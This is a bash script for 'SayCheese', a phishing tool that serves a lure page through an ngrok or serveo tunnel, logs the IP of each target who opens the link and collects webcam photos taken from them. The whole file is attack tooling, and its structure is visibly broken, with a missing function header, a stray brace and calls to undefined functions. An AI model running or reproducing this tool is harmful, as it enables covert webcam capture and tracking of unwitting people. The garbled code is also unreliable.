#!/bin/bash
# SayCheese v2.0
# coded by: https://github.com/gauravraj0408/
# original developer : https://github.com/thelinuxchoice/
# Note : Original code by (@thelinuxchoice) does not work properly so i modified it a bit
# Note : Don't judge the code i'm beginner
# credits : @thelinuxchoice
# If you use any part from this code, giving me the credits. Read the Lincense!

echo " "
echo -e "\e[92m               ╔════════════════════════════════════════════════╗"
echo -e "\e[92m               ║     \e[91m██████╗  ██████╗ ██████╗  ██████╗ ████████╗\e[92m║"
echo -e "\e[92m               ║     \e[91m██╔══██╗██╔═══██╗██╔══██╗██╔═══██╗╚══██╔══╝\e[92m║"
echo -e "\e[92m               ║     \e[91m██████╔╝██║   ██║██████╔╝██║   ██║   ██║   \e[92m║"
echo -e "\e[92m               ║     \e[91m██╔══██╗██║   ██║██╔══██╗██║   ██║   ██║   \e[92m║"
echo -e "\e[92m               ║ Mr. \e[91m██║  ██║╚██████╔╝██████╔╝╚██████╔╝   ██║   \e[92m║"
echo -e "\e[92m               ║     \e[91m╚═╝  ╚═╝ ╚═════╝ ╚═════╝  ╚═════╝    ╚═╝   \e[92m║"
echo -e "\e[92m               ╚════════════════════════════════════════════════╝"                                 
echo -e "\e[92m                         Say Cheese and Get the Photos ;) "
echo " "

stop() {

checkphp=$(ps aux | grep -o "php" | head -n1)

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
exit 1

}

dependencies() {


command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
 


}

catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

cat ip.txt >> saved.ip.txt


}

checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip
rm -rf ip.txt

fi

sleep 0.5

if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
rm -rf Log.log
fi
sleep 0.5

done 

}


server() {

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi

printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server on localhost... (localhost:3333)\e[0m\n"
fuser -k 3333/tcp > /dev/null 2>&1
php -S localhost:3333 > /dev/null 2>&1 &
sleep 3
}


payload_ngrok() {

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
sed 's+forwarding_link+'$link'+g' saycheese.html > index2.html
sed 's+forwarding_link+'$link'+g' template.php > index.php


}


printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server on localhost...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Note : You Should Use Port Forward for getting link over WAN...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;92m[\e[0m*\e[1;92m] Direct link : localhost:3333\e[0m\e[1;77m %s\e[0m\n" $link

payload_ngrok
checkfound
}

start1() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
default_option_server="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m' option_server
option_server="${option_server:-${default_option_server}}"
if [[ $option_server -eq 1 ]]; then

command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
start

elif [[ $option_server -eq 2 ]]; then
ngrok_server
else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
start1
fi

}


payload() {

send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)

sed 's+forwarding_link+'$send_link'+g' saycheese.html > index2.html
sed 's+forwarding_link+'$send_link'+g' template.php > index.php


}

start() {

default_choose_sub="Y"
default_subdomain="saycheese$RANDOM"

printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
read choose_sub
choose_sub="${choose_sub:-${default_choose_sub}}"
if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
subdomain_resp=true
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
read subdomain
subdomain="${subdomain:-${default_subdomain}}"
fi

server
payload
checkfound

}

banner
dependencies
start1

